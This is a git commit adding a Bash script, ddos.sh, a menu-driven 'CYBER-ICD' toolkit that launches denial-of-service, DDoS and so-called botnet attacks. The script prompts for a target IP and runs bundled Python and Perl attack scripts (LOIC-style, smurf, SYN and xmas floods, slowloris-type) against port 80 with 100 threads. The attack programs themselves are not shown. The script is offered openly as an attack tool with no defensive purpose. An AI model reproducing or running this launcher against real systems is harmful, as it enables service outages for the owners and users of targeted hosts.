b2ee41cf963cf0004f13bc9a7c4dd227ce8f0e2f
Maruf x ZeroTrace <mmarufbillah887@gmail.com>
2025-11-08 19:57:31 +0600

    Add files via upload

---
+++ ddos.sh
@@ -0,0 +1,150 @@
+#Denial Of Service and ddos attack 
+# Author :-  Maruf x ZeroTrace
+# WhatsApp :- 01814007229
+#RECODE ©®
+figlet CYBER-ICD
+echo
+echo $green"==========================================="
+echo $white"        Toolkit   Menu                     "
+echo $green"============================================="
+echo $red"[1].DDOS ATTACK.   #Maruf x ZeroTrace"
+echo $red"[2].DoS ATTACK.    #01814007229"
+echo $red"[3].BOTNET ATTACK. #Maruf x Hackers"
+echo $red"[4].EXIT TOOL.     #   CYBER-ICD"
+echo $red"Hi,Face any problem,Contact me Whatsapp"
+echo $green"============================================="
+echo $white "╭─"$yellow"•⊱Maruf x ICD"
+read -p " ╰─> " pil
+
+#DDOS
+
+if [ $pil = 1 ] || [ $pil = 1 ]
+then
+clear
+toilet -f slant "ALL ACTION" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].LOIC"
+echo $yellow"[2].AMNESIA"
+echo $yellow"[3].PING OF DEADHT"
+echo $yellow"[4].POF ARMAGEDON LEVEL"
+echo $yellow"[5].LORIS"
+echo $yellow"[6].exit"
+echo $green"============================================="
+echo $white "╭─"$yellow"•⊱•ICD"
+read -p " ╰─> " ddos
+fi
+
+if [ $ddos = 1 ] || [ $ddos = 1 ]
+then
+clear
+python2 LO1C.py
+fi
+
+if [ $ddos = 2 ] || [ $ddos = 2 ]
+then
+clear
+perl Amnesia.pl
+fi
+
+if [ $ddos = 3 ] || [ $ddos = 3 ]
+then
+clear
+python2 TheSploit.py
+fi
+
+if [ $ddos = 4 ] || [ $ddos = 4 ]
+then
+clear
+python2 arma.py
+fi
+
+if [ $ddos = 5 ] || [ $ddos = 5 ]
+then
+clear
+python2 lor.py
+fi
+
+
+#DOS
+
+
+
+if [ $pil = 2 ] || [ $pil = 2 ]
+then
+clear
+toilet -f slant "ICD-DOS" -F metal
+echo
+echo $green"============================================="
+echo $yellow"[1].WIN"
+echo $yellow"[2].SUMFR"
+echo $yellow"[3].UFOSYN"
+echo $yellow"[4].XMAS"
+echo $yellow"[5].ANDROMEDR"
+echo $green"============================================="
+echo $white "╭─"$yellow"•⊱•MARUFxICD"
+read -p " ╰─> " dos
+fi
+
+
+
+if [ $dos = 1 ] || [ $dos = 1 ]
+then
+clear
+toilet -f slant "ACTION"
+echo $red"IP TARGET"
+read -p "===>" win
+python2 win.32.64.NT.py -s$win -p80 -t100
+fi
+
+
+
+if [ $dos = 2 ] || [ $dos = 2 ]
+then
+clear
+python2 smurf.py
+fi
+
+if [ $dos = 3 ] || [ $dos = 3 ]
+then
+clear
+python2 ufosyn.py
+fi
+
+if [ $dos = 4 ] || [ $dos = 4 ]
+then
+clear
+python2 xmas.py
+fi
+
+if [ $dos = 5 ] || [ $dos = 5 ]
+then
+clear
+toilet -f slant "DROID RX" |lolcat
+echo $red"IP TARGET"
+read -p "===>" ipt
+clear
+echo
+python2 andromeda.py -s$ipt -p80 -t100
+fi
+
+
+
+#BOTNET
+
+if [ $pil = 3 ] || [ pil = 3 ]
+then
+clear
+toilet -f slant " BOTNET" -F gay
+echo $red" IP TARGET"
+read -p "==>" bot
+python2 Botnet.py -s$bot -p80 -t100
+fi
+
+#exit
+
+if [ $pil = 4 ] || [ pil = 4 ]
+then
+clear
+exit
+fi
